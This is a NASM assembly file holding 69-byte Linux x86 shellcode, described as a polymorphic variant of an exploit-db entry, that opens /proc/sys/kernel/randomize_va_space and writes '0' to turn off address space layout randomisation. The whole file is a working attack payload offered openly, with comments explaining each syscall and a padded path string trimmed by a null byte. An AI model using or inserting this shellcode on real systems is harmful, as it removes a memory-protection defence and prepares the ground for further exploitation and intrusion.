; Filename: disable-aslr.nasm
; Author:  Juanma Reyes
; Website:  jmreyes.net
;
; Linux x86 Disable ASLR shellcode (69 bytes) 
; Polymorphic version of https://www.exploit-db.com/exploits/36637/

global _start			

section .text
_start:
	push 0x5
	pop eax		; EAX = 0x5 (select open() syscall)
	jmp path
continue:
	pop ebx
	mov [ebx+35], ah ; Add null termination to path
	push 0x2
	pop ecx
	int 0x80

	xchg edx, ecx	; EDX = 0x2
	xchg ebx, eax	; EBX = file descriptor from open()
	push 0x4
	pop eax		; EAX = 0x4 (select write() syscall)
	push word 0x30 	; '0' at the stack
	mov ecx, esp
	int 0x80

	; EAX is 1 (exit() syscall) already at this point since 1 byte was written
	int 0x80

path:
	call continue
	db '/proc/sys/kernel/randomize_va__space' ; No idea why it needs two underscores


